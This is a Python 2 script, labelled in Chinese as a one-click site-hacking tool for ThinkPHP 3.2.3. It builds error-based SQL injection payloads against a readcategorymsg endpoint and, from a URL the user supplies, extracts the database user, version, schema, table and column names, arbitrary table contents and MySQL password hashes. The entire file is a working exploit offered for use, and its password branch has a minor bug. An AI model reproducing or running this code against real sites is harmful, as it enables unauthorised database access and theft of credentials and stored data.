# -*- coding: UTF-8 -*-
import requests
import sys
import re

print('欢迎使用thinkphp3.2.3一键日站工具，作者:kurokoleung')
print('如果要查看用户，输入user，查看版本，输入version,查看数据库名，输入database，查看表名，输入table,查看列名，输入column，查看内容，输入content')

url = raw_input('请输入站点url:')
options = raw_input('请输入选项:')

if(options == "user"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20user())),0))"
elif(options == "version"):
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and(updatexml(1,concat(0x7e,(select%20version())),0))"
elif(options == "database"):
  i = raw_input('请输入要爆破第几个数据库名:')
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,%20concat(0x5c,%20(select%20schema_name%20from%20information_schema.schemata%20limit%20{i},1)))".format(i=i)
elif(options == "password"):
  user = raw_input('请输入要爆破的用户名:')
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,concat(0x5c,(select%20password%20from%20mysql.user%20where%20host=%27{user}%27%20limit%20{i},1)))".format(user=user)
elif(options == "table"):
  dbname = raw_input('请输入要爆破的表的数据库名:')
  i = raw_input('请输入要爆破的表名:')
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,%20concat(0x5c,%20(select%20table_name%20from%20information_schema.columns%20where%20table_schema=%27{dbname}%27%20limit%20{i},1)))".format(dbname=dbname,i=i)
elif(options == "column"):
  tbname = raw_input('请输入要爆破的列的表名:')
  i = raw_input('请输入要爆破第几个列名:')
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,concat(0x5c,(select%20column_name%20from%20information_schema.columns%20where%20table_name=%27{tbname}%27%20limit%20{i},1)))".format(tbname=tbname,i=i)
elif(options == "content"):
  dbname = raw_input('请输入要爆破的内容的数据库名:')
  tbname = raw_input('请输入要爆破的内容的表名:')
  coname = raw_input('请输入要爆破的内容的列名:')
  i = raw_input('请输入要获取第几个列的内容:')
  payload = "/Home/Index/readcategorymsg?category[0]=bind&category[1]=0%20and%20extractvalue(1,concat(0x5c,(select%20{coname}%20from%20{dbname}.{tbname}%20limit%20{i},1)))".format(dbname=dbname,tbname=tbname,coname=coname,i=i)
else:
  print('Invalid options')
  print(options)
  sys.exit(-1)

def Poc(url,options):
  url = url + payload
  req = requests.get(url,timeout=5)
  r = (req.text)
  pattern = re.compile("syntax error: '(.*)'")
# print(payload)
#  print(col)
#  print(type(col))
# print(r)
  s = (pattern.findall(r))[0][1:]
  print(s.encode('unicode_escape').decode('string_escape'))
  #s1 = s[0].decode('utf-8')
  #print(s1)

Poc(url,options)